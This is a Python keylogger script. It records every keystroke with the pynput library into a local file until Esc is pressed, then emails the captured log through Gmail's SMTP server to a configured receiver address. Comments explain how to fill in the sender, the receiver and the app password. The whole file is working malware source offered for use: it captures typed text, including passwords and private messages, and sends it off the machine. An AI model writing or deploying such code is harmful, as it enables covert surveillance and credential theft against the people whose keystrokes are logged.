import smtplib
import ssl
from pynput import keyboard


sender_mail = "sender_email@gmail.com"
#Change this to the email of the sender. Example: bob123@gmail.com
receiver_mail = "receiver_email@gmail.com"
#change this to the email of the receiver. Example: Dave123@gmail.com
password = "Email App password"
#In gmail settings you will need to turn on two factor authentication and also create an app password.
message = """From: sender_email@gmail.com
To: receiver_email@gmail.com                     
Subject: Logs from Keylogger
Text: The keylogger has logged this: 
"""
port = 25 
#this will work on ports 25, 465, and 587 but the method of connecting to the SMTP server will be different. 
#Go to this website for refrence of how to set up the other methods: https://realpython.com/python-send-email/
def write(text):
    with open("keylogger.txt",'a') as f:
        f.write(text)
        
def start(Key):
    try:
        if(Key == keyboard.Key.enter):
            write("\n")
        else:
            write(Key.char)
    except AttributeError:
        if Key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif(Key == keyboard.Key.tab):
            write("\nTab Pressed\n")
        elif(Key == keyboard.Key.space):
            write(" ");
        else:
            temp = repr(Key)+" Pressed.\n"
            write(temp)
            print("\n{} Pressed\n".format(Key))

def stop(Key):
    if(Key == keyboard.Key.esc):
        return False

with keyboard.Listener(on_press = start, on_release = stop) as listener:
    listener.join()

print(sender_mail, receiver_mail, port, password)

with open("keylogger.txt",'r') as f:
    temp = f.read()
    message = message + str(temp)
    


print(sender_mail, receiver_mail, port, password)
context = ssl.create_default_context()
with smtplib.SMTP('smtp.gmail.com', port) as server:
    print(sender_mail, receiver_mail, port, password)
    server.starttls(context = context)
    server.ehlo()
    server.login(sender_mail, password)
    server.sendmail(sender_mail, receiver_mail, message)
    print("Email Sent to ",sender_mail)
    server.quit()

f.close()
